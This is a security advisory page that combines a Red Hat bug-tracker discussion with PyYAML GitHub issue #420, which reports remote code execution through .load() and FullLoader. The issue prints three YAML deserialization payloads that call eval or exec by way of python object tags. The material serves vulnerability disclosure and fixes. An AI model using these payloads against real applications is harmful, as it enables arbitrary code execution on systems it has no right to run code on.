However, it is still possible to bypass such blacklist by carefully nesting objects.   ```  [Comment 13](show_bug.cgi?id=1860466#c13)  Riccardo Schirone    2020-09-24 08:09:34 UTC  ``` Upstream opinion on the topic: <https://github.com/yaml/pyyaml/issues/420#issuecomment-696752389> .   ```  [Comment 15](show_bug.cgi?id=1860466#c15)  John Eckersberg    2021-01-15 14:15:07 UTC  ``` Oops sorry closed the wrong bug.

So Ansible Tower and Ansible Engine are not affected.  Red Hat Quay, from version 3.4 uses the safe_load function which is not affected by this issue. See [1].  Even though the CVSSv3 for this flaw is 9.8, the Impact has been set to Moderate because PyYAML provides a specific method to deal with untrusted input, which is `yaml.safe_load`. `yaml.safe_load` or the SafeLoader loader should be used whenever the input YAML can be modified by a malicious user.

# .load() and FullLoader still vulnerable to fairly trivial RCE #420

## Description

![@arxenix](https://avatars.githubusercontent.com/u/1356005?u=deaa96b4e27b0c621d89fd3e2cb64286c1af3886&v=4&size=48)[arxenix](https://github.com/arxenix)opened [on Jul 22, 2020](https://github.com/yaml/pyyaml/issues/420#issue-663569505)

As of 5.3.1 .load() defaults to using FullLoader and FullLoader is still vulnerable to RCE when run on untrusted input. As demonstrated by the examples below, [#386](https://github.com/yaml/pyyaml/pull/386) was not enough to fix this issue.

Some example payloads:

```
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - [ "RCE_HERE" ]

```

```
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "RCE_HERE"

```

```
- !!python/object/new:str
    args: []
    state: !!python/tuple
    - "RCE_HERE"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec

```

I do not believe this is entirely fixable unless PyYAML decides to use secure defaults, and make .load() equivalent to .safe\_load() ( [#5](https://github.com/yaml/pyyaml/issues/5) )

FullLoader should probably be removed, as I don't see the purpose of it.
